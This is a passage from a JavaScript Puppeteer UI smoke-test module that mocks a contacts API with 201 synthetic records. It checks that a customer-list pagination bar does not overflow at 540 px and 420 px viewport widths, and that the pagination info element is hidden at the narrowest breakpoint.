
      const memberSess = await login(users.member.email, PASSWORD);
      const kv = parseCookieKV(memberSess.cookie);
      if (kv) {
        const { hostname } = new URL(BASE);
        await page.setCookie({
          name: kv.name, value: kv.value,
          domain: hostname, path: '/', httpOnly: true,
        });
      }

      const tabletContacts = Array.from({ length: 201 }, (_, i) => ({
        id: `tablet-pg-${i + 1}`,
        properties: {
          firstname: 'Tablet',
          lastname: `Page${String(i + 1).padStart(3, '0')}`,
          email: `tabletpg${i + 1}@privtest.local`,
          phone: '',
          hs_lead_status: 'OPEN_DEAL',
          city: '',
          customer_number: `TB-${String(i + 1).padStart(3, '0')}`,
          createdate: new Date(Date.now() - i * 1000).toISOString(),
          closedate: null,
          lastmodifieddate: new Date().toISOString(),
        },
        createdAt: new Date().toISOString(),
        updatedAt: new Date().toISOString(),
        archived: false,
      }));
      const tabletPayload = JSON.stringify({ results: tabletContacts, total: 201, page: 1, totalPages: 9 });
      const emptyPayload  = JSON.stringify({ results: [], total: 0, page: 1, totalPages: 1 });

      await page.setRequestInterception(true);
      page.on('request', req => {
        const u = req.url();
        if (u.includes('/api/contacts-all')) {
          req.respond({ status: 200, contentType: 'application/json', body: tabletPayload });
        } else if (u.includes('/api/open-leads')) {
          req.respond({ status: 200, contentType: 'application/json', body: emptyPayload });
        } else {
          req.continue();
        }
      });

      await page.goto(`${BASE}/customers`, { waitUntil: 'domcontentloaded' });

      const paginationElTablet = await page.waitForSelector('.cl-pagination', { timeout: 8000 }).catch(() => null);

      let noOverflowTablet = false;
      let overflowDetailTablet = 'pagination bar not found';

      if (paginationElTablet) {
        // Jump to page 8 so multi-digit page numbers (if visible) and ellipsis render.
        await page.evaluate(() => {
          const input = document.querySelector('#cl-jump-input');
          const form  = document.querySelector('#cl-jump-form');
          if (input && form) {
            input.value = '8';
            form.dispatchEvent(new Event('submit', { bubbles: true, cancelable: true }));
          }
        }).catch(() => {});

        // Wait for the pagination info to reflect page 8 content (items 176–200 of 201).
        await page.waitForFunction(() => {
          const info = document.querySelector('.cl-pagination-info');
          return info && /176|177|178/.test(info.textContent);
        }, { timeout: 5000 }).catch(() => {});

        const dims = await page.$eval('.cl-pagination', el => ({
          scrollWidth: el.scrollWidth,
          clientWidth: el.clientWidth,
        })).catch(() => null);

        if (dims) {
          noOverflowTablet = dims.scrollWidth <= dims.clientWidth;
          overflowDetailTablet = `scrollWidth=${dims.scrollWidth} clientWidth=${dims.clientWidth}`;
        }
      }

      await safeShot(page, path.join(SCREENSHOT_DIR, `${runId}-tablet-pagination-overflow.png`));

      record('pagination bar does not overflow at 540 px with 9 pages (tablet breakpoint variant)',
        'scrollWidth <= clientWidth on .cl-pagination at 540 px with 201 contacts on page 8',
        overflowDetailTablet,
        'medium', noOverflowTablet);

      await page.close();
    } catch (e) {
      record('tablet pagination overflow regression probe (540 px) ran', 'no error',
        `error: ${e.message}`, 'medium', false);
    }

    // ── Narrowest breakpoint overflow — 420 px ────────────────────────────────
    // At max-width: 420px the CSS additionally hides .cl-pagination-info and
    // .cl-pagination-jump-label.  This probe isolates that threshold to confirm:
    //   (a) no overflow occurs on .cl-pagination
    //   (b) .cl-pagination-info is not visible (display:none / hidden)
    // Uses 201 contacts (9 pages) and navigates to page 8 (same as 540 px variant).
    try {
      const page = await browser.newPage();
      await page.setViewport({ width: 420, height: 740 });
      await page.setCacheEnabled(false);

      const memberSess = await login(users.member.email, PASSWORD);
      const kv = parseCookieKV(memberSess.cookie);
      if (kv) {
        const { hostname } = new URL(BASE);
        await page.setCookie({
          name: kv.name, value: kv.value,
          domain: hostname, path: '/', httpOnly: true,
        });
      }

      const narrowContacts = Array.from({ length: 201 }, (_, i) => ({
        id: `narrow-pg-${i + 1}`,
        properties: {
          firstname: 'Narrow',
          lastname: `Page${String(i + 1).padStart(3, '0')}`,
          email: `narrowpg${i + 1}@privtest.local`,
          phone: '',
          hs_lead_status: 'OPEN_DEAL',
          city: '',
          customer_number: `NW-${String(i + 1).padStart(3, '0')}`,
          createdate: new Date(Date.now() - i * 1000).toISOString(),
          closedate: null,
          lastmodifieddate: new Date().toISOString(),
        },
        createdAt: new Date().toISOString(),
        updatedAt: new Date().toISOString(),
        archived: false,
      }));
      const narrowPayload = JSON.stringify({ results: narrowContacts, total: 201 });
      const emptyPayload  = JSON.stringify({ results: [], total: 0 });

      await page.setRequestInterception(true);
      page.on('request', req => {
        const u = req.url();
        if (u.includes('/api/contacts-all')) {
          req.respond({ status: 200, contentType: 'application/json', body: narrowPayload });
        } else if (u.includes('/api/open-leads')) {
          req.respond({ status: 200, contentType: 'application/json', body: emptyPayload });
        } else {
          req.continue();
        }
      });

      await page.goto(`${BASE}/customers`, { waitUntil: 'domcontentloaded' });

      const paginationElNarrow = await page.waitForSelector('.cl-pagination', { timeout: 8000 }).catch(() => null);

      let noOverflowNarrow = false;
      let overflowDetailNarrow = 'pagination bar not found';
      let infoHidden = false;
      let infoHiddenDetail = 'pagination bar not found';

      if (paginationElNarrow) {
        // Jump to page 8 so the pagination renders multi-digit numbers and ellipsis.
        await page.evaluate(() => {
          const input = document.querySelector('#cl-jump-input');
          const form  = document.querySelector('#cl-jump-form');
          if (input && form) {
            input.value = '8';
            form.dispatchEvent(new Event('submit', { bubbles: true, cancelable: true }));
          }
        }).catch(() => {});

        // Wait for the pagination to reflect page 8 content (items 176–200 of 201).
        await page.waitForFunction(() => {
          const info = document.querySelector('.cl-pagination-info');
          return info && /176|177|178/.test(info.textContent);
        }, { timeout: 5000 }).catch(() => {});

        const dims = await page.$eval('.cl-pagination', el => ({
          scrollWidth: el.scrollWidth,
          clientWidth: el.clientWidth,
        })).catch(() => null);

        if (dims) {
          noOverflowNarrow = dims.scrollWidth <= dims.clientWidth;
          overflowDetailNarrow = `scrollWidth=${dims.scrollWidth} clientWidth=${dims.clientWidth}`;
        }

        // Assert that .cl-pagination-info is hidden at 420 px (display:none per CSS).
        const infoVisibility = await page.$eval('.cl-pagination-info', el => {
          const style = window.getComputedStyle(el);
          return {
            display: style.display,
            visibility: style.visibility,
            offsetParent: el.offsetParent !== null,
          };
        }).catch(() => null);

        if (infoVisibility) {
          infoHidden = infoVisibility.display === 'none' || infoVisibility.visibility === 'hidden' || !infoVisibility.offsetParent;
          infoHiddenDetail = `display=${infoVisibility.display} visibility=${infoVisibility.visibility} offsetParent=${infoVisibility.offsetParent}`;
        }
      }

      await safeShot(page, path.join(SCREENSHOT_DIR, `${runId}-420px-pagination-overflow.png`));

      record('pagination bar does not overflow at 420 px with 9 pages (narrowest breakpoint)',
        'scrollWidth <= clientWidth on .cl-pagination at 420 px with 201 contacts on page 8',
        overflowDetailNarrow,
        'medium', noOverflowNarrow);

      record('.cl-pagination-info is hidden at 420 px viewport width',
        'display:none or not visible per computed style',
        infoHiddenDetail,
        'medium', infoHidden);

      await page.close();
    } catch (e) {
      record('narrowest breakpoint pagination overflow probe (420 px) ran', 'no error',
        `error: ${e.message}`, 'medium', false);
    }
  } finally {
    await browser.close().catch(() => {});
  }

  return findings;
}

module.exports = { runUiSmoke, SCREENSHOT_DIR };
